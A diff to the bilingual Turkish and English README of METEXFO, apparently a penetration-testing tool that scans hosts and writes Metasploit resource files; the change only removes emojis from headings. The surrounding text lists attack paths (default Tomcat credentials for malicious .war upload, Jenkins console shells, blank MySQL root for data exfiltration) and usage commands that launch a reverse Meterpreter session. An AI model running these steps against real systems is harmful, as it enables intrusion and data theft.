@@ -35,7 +35,7 @@
 
 ## 🇹🇷 Türkçe Dökümantasyon
 
-### 🌌 Genel Bakış & Çalışma Mantığı
+###  Genel Bakış & Çalışma Mantığı
 METEXFO v1.2, sızma testi süreçlerinde hedef sistemlerdeki **yapılandırma hatalarını (Misconfigurations)** ve **açık yönetim panellerini** tespit etmek için geliştirilmiş çift dilli, çoklu iş parçacıklı (Multi-threading) bir otomasyon aracıdır. 
 
 Yazılım şu adımlarla çalışır:
@@ -43,12 +43,12 @@ Yazılım şu adımlarla çalışır:
 2. **Eşleştirme:** Bulunan servislere göre kendi yerleşik zafiyet veritabanını kontrol eder.
 3. **Komut Hazırlığı:** HEDEF SİSTEME yönelik en uygun Metasploit modüllerini otomatik olarak listeler ve bir `.rc` (Resource) saldırı dosyası oluşturur.
 
-### 💀 Sızma Yolları ve Neler Yapabilir?
+###  Sızma Yolları ve Neler Yapabilir?
 * **Apache Tomcat (Port 8080):** Varsayılan şifreleri (`admin:admin`, `tomcat:tomcat`) deneyerek yönetim panelini ele geçirir. Panele `.war` uzantılı bir dosya yükleyerek uzak kod çalıştırma (RCE) sağlar.
 * **Jenkins Sunucusu (Port 80/443):** Kimlik doğrulaması istemeyen veya açık unutulmuş otomasyon panellerini yakalar. Jenkins konsolu üzerinden doğrudan HEDEF SİSTEMİN komut satırına sızar.
 * **MySQL Veritabanı (Port 3306):** `root` hesabının şifresiz (boş parola) bırakıldığı senaryoları yakalar. Veritabanındaki tüm kullanıcı şifrelerini ve tabloları dışarı sızdırabilir.
 
-### 🚀 Kullanım
+###  Kullanım
 ```bash
 # Kurulum ve Bağımlılıklar
 git clone https://github.com/ghost0x02/metexfo
@@ -62,7 +62,7 @@ python3 metexfo.py -t <HEDEF_IP> -l <KENDİ_IP> --lang tr
 msfconsole -q -r metexfo.rc
 ```
 
-### ⚡ Sızma İşlemi Başarılı Olduğunda Alınacak Terminal Çıktısı
+###  Sızma İşlemi Başarılı Olduğunda Alınacak Terminal Çıktısı
 Üretilen `.rc` dosyası çalıştırıldığında HEDEF SİSTEM üzerinde sızma işlemi başarıyla gerçekleşirse, terminal ekranında açılacak olan **Meterpreter** oturumu şu şekilde olacaktır:
 
 ```text
@@ -92,7 +92,7 @@ meterpreter > _
 
 ## 🇺🇸 English Documentation
 
-### 🌌 Overview & Working Logic
+###  Overview & Working Logic
 METEXFO v1.2 is a localized, multi-threaded security orchestrator designed to hunt down **configuration flaws (Misconfigurations)** and **exposed management panels** on target systems.
 
 The automation pipeline operates as follows:
@@ -100,12 +100,12 @@ The automation pipeline operates as follows:
 2. **Matching:** Correlates running services directly with its vulnerability database.
 3. **Command Construction:** Generates Metasploit resource macros (`.rc`) tailored exactly to the TARGET SYSTEM.
 
-### 💀 Attack Vectors & Capabilities
+###  Attack Vectors & Capabilities
 * **Apache Tomcat (Port 8080):** Targets default manager credentials (`admin:admin`, `tomcat:tomcat`). Enables Remote Code Execution (RCE) by deploying a malicious `.war` archive.
 * **Jenkins Orchestrator (Port 80/443):** Detects unauthenticated automation setups. Leverages the built-in console to spawn system shells on the TARGET SYSTEM.
 * **MySQL Database (Port 3306):** Checks for blank `root` administration credentials. Allows total data exfiltration including password lists and tables.
 
-### 🚀 Usage
+###  Usage
 ```bash
 # Clone & Requirements
 git clone https://github.com/ghost0x02/metexfo
@@ -119,7 +119,7 @@ python3 metexfo.py -t <TARGET_IP> -l <YOUR_LHOST> --lang en
 msfconsole -q -r metexfo_final_agent.rc
 ```
 
-### ⚡ Post-Exploitation Terminal Output Preview
+###  Post-Exploitation Terminal Output Preview
 When the compiled blueprint runs against the TARGET SYSTEM and compromises the host, your terminal will immediately lock into an active **Meterpreter shell** as simulated below:
 
 ```text
